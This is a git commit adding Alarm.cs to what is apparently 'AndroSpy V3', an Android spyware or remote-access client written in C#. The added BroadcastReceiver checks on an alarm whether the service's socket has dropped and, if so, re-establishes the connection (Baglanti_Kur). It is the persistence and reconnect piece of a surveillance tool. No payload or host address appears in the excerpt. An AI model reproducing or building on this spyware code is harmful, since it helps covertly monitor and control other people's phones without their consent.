691d4a5cd53966f8b3166aa9055a6362593a147e
qH0sT <asuslaptop230@gmail.com>
2021-05-20 13:18:06 +0300

    AndroSpy V3 - Release 2021 May

---
+++ Client/Alarm.cs
@@ -0,0 +1,23 @@
+﻿using Android.Content;
+
+namespace Task2
+{
+    [BroadcastReceiver]
+    class Alarm : BroadcastReceiver
+    {
+        public override void OnReceive(Context context, Intent intent)
+        {
+            if (intent.Action != null)
+            {
+                if (intent.Action == "MY_ALARM_RECEIVED")
+                {
+                    if (ForegroundService.mySocketConnected == false)
+                    {
+                        ForegroundService._globalService.cancelAlarm(context);
+                        ForegroundService._globalService.Baglanti_Kur();
+                    }
+                }
+            }
+        }
+    }
+}
